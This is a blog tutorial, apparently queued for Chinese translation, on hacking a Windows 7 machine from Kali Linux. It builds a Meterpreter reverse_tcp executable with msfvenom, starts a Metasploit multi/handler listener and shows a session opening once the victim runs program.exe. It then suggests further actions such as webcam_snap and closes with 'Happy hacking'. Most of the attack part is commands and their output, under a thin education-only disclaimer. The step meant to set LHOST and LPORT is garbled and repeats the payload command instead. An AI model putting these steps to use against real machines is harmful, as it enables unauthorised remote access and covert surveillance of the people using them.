Quick Guide: How To hack windows with Kali Linux
============================================================

Kali Linux is derived from Debian Linux flavor and its mainly used for penetration tasting. It has more than 300 pre-installed  penetration-testing programs. It is a supported platform of the Metasploit Project’s Metasploit Framework, a tool for developing and executing security exploits. Let begin with hack windows with Kali Linux.Kindly note that , I am writing this post for education purpose only.

Source machine details:

Kali Linux

```
root@kali:/# uname -a
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux
root@kali:/#
```

Target machine used for hacking:


```
Windows 7 Ultimate SP1 
```

Step 1\. Create Payload

Payload is a program which is similar as a virus or trojan which get executed on the remote machine for hacking purpose. To create payload program use below command which will hack windows with Kali Linux.

```
root@kali:/# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=4444 --format=exe -o /root/program.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
Saved as: /root/program.exe
root@kali:/# ls -la /root/program.exe
-rw-r--r-- 1 root root 73802 Jan 26 00:46 /root/program.exe
```

With ls command we have confirmed that our Payload program is successfully created at the given location.

Step 2: Run mfsconsole command which will start msf prompt.

```
root@kali:# msfconsole


                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


Taking notes in notepad? Have Metasploit Pro track & report
your progress and findings -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.12.22-dev                         ]
+ -- --=[ 1577 exploits - 906 auxiliary - 272 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf >
```


Step 3:  For exploiting I have used following details:

*   Port 4444: you can use as per your choice
*   LHOST IP: which is nothing but the Kali Linux machines IP 192.168.189.128\. to Know ip of your kali machine use below command.

```
root@kali:/# ip r l
192.168.189.0/24 dev eth0  proto kernel  scope link  src 192.168.189.128  metric 100
root@kali:/#
```


Now give following command at msf prompt “use exploit/multi/handler”

```
msf > use exploit/multi/handler
msf exploit(handler) >
```

Then give command “set payload windows/meterpreter/reverse_tcp” at the next prompt:

```
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```


Now set local IP and port using LHOST and LPORT command as below:

```
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

and finally give exploit command.

```
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.189.128:4444
[*] Starting the payload handler...
```

Now you need to execute the “program.exe” on the windows machine once its executed on target machine , you can able to establish a meterpreter session. Just type sysinfo to get the details hacked windows machine.

```
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.189.128:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.189.1
[*] Meterpreter session 1 opened (192.168.189.128:4444 -> 192.168.189.1:53091) at 2017-01-26 00:51:31 +0000

meterpreter > sysinfo
Computer        : MANN-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64 (Current Process is WOW64)
System Language : en_IN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
```


Once you successfully get this details you can do more exploit or get more information using “help” command which will show all the options by which you can hack the system e.g. to get the webcam snap use command “webcam_snap” same way you can use many available option available. Happy hacking!!!!

--------------------------------------------------------------------------------

via: http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/

作者：[Manmohan Mirkar][a]
译者：[译者ID](https://github.com/译者ID)
校对：[校对者ID](https://github.com/校对者ID)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/
[1]:http://www.linuxroutes.com/author/admin/
[2]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#respond
[3]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[4]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[5]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[6]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[7]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[8]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[9]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[10]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[11]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[12]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
[13]:http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/#
